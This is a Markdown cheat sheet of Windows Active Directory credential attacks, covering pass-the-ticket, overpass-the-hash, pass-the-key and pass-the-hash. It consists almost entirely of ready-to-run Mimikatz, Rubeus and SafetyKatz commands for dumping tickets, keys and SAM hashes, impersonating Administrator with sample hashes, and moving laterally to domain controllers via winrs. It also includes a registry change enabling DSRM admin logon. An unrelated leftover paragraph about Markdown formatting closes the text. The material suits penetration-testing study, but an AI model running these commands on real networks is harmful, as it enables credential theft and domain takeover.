# PTH, PTT, Overpth, ptk

### Pass-the-Ticket

```markdown
## Extract ticket
privilege::debug => sekurlsa::tickets /export
```

### Inject ticket into current session

```powershell
kerberos::ptt [0;304edb]-2-0-40e10000-Administrator@krbtgt-WARGREY.MON.kirbi
winrs.exe -r:<any other dc> cmd.exe
```

Reference: [Experimenting with Kerberos Ticket Formats](https://tw1sm.github.io)

***

## Overpass-the-hash / Pass-the-Key

### Obtain encryption key

```powershell
privilege::debug => sekurlsa::ekeys
```

#### RC4 algorithm

```bash
sekurlsa::pth /user:Administrator /domain:pdc.wargrey.mon /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:powershell.exe
```

#### AES128

```plaintext
sekurlsa::pth /user:Administrator /domain:pdc.wargrey.mon /aes128:b65ea8151f13a31d01377f5934bf3883 /run:powershell.exe
```

#### AES256

```plaintext
sekurlsa::pth /user:Administrator /domain:pdc.wargrey.mon /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:powershell.exe
```

```plaintext
winrs.exe -r:<any other dc> cmd.exe
```

#### Using Rubeus

```plaintext
Rubeus.exe asktgt /user:administrator /rc4:ntlmhash /ptt
Rubeus.exe asktgt /user:administrator/aes256:ntlmhash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
Rubeus.exe ptt /ticket:base64
```

***

## Pass-the-hash

```powershell
Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "lsadump::sam""exit"'
Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::msv""exit"'
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD
```

```markup
mimikatz# token::revert
mimikatz# sekurlsa::pth /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /domain:pdc /run:powershell.exe
mimikatz# sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256 krbtgt hash> /run:powershell.exe
```

```powershell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256 krbtgt hash> /run:cmd.exe" “exit”
```

```powershell
Rubeus.exe asktgt /user:SHALBY /rc4:5D88C6E440C1B976A9C1A2EF6AD66083 /ptt
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
SafetyKatz.exe “sekurlsa::pth /user:user /domain:anything.domain.local /aes256:<> /run:cmd.exe” “exit”
```

```markup
winrs -r:dc whoami
winrs -r:dc cmd
```

PtH involved directly authenticating to a host by literally sending the password’s hash to the host during the authentication process, while OPtH is way more subtle as it abuses Kerberos authentication.

***

## overPassTheHash

[Video Reference](https://youtu.be/EA2kod-okIg?si=t6s0OoxRsoGzRcWY)

````

In Markdown, each section is separated by headers (`#` for main headers and `##` for sub-headers), and code blocks are denoted by triple backticks ``` before and after the code/text. Links are formatted using `[text](URL)`. Adjust the formatting as per your preference or style guide.
````
